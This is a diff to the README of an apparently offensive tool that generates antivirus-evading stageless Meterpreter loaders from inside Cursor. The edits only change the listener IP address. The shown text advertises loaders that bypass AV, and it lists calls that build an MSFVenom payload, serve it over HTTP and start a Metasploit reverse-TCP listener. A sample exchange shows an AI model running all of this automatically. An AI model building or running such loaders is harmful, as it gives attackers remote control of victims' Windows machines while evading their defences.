@@ -11,7 +11,7 @@
 
 ## What It Does
 
-**You say (in Cursor):** "Generate stageless loader for 192.168.1.56:4444"
+**You say (in Cursor):** "Generate stageless loader for 10.10.10.100:4444"
 
 **System delivers:**
 - Working stageless loader.exe (bypasses AV)
@@ -161,7 +161,7 @@ Then you:
 **Main tool - FULLY AUTOMATED! Does everything for you!**
 
 ```python
-noctis_generate_stageless_loader("192.168.1.56", 4444, 8080)
+noctis_generate_stageless_loader("10.10.10.100", 4444, 8080)
 
 # Automatically does:
 # 1. Generates MSFVenom payload (stageless meterpreter)
@@ -192,7 +192,7 @@ noctis_check_status()
 **Manually start HTTP server and MSF listener**
 
 ```python
-noctis_start_servers("192.168.1.56", 4444, 8080)
+noctis_start_servers("10.10.10.100", 4444, 8080)
 
 # Starts:
 # - HTTP server (serves payload.enc)
@@ -270,15 +270,15 @@ noctis_test_binary("/path/to/stageless_loader.exe")
 ### In Cursor with AI:
 
 ```
-YOU: Generate stageless loader for 192.168.1.56:4444
+YOU: Generate stageless loader for 10.10.10.100:4444
 
 AI: I'll generate and set up everything automatically...
 
-[AI calls: noctis_generate_stageless_loader("192.168.1.56", 4444, 8080)]
+[AI calls: noctis_generate_stageless_loader("10.10.10.100", 4444, 8080)]
 
 STAGELESS LOADER GENERATED!
 
-LHOST: 192.168.1.56
+LHOST: 10.10.10.100
 LPORT: 4444
 HTTP Port: 8080
 
@@ -295,7 +295,7 @@ HTTP Server: RUNNING on port 8080
    PID: 12345
 
 Metasploit Listener: RUNNING
-   Listening: 192.168.1.56:4444
+   Listening: 10.10.10.100:4444
    Payload: windows/x64/meterpreter_reverse_tcp
    PID: 12346
 
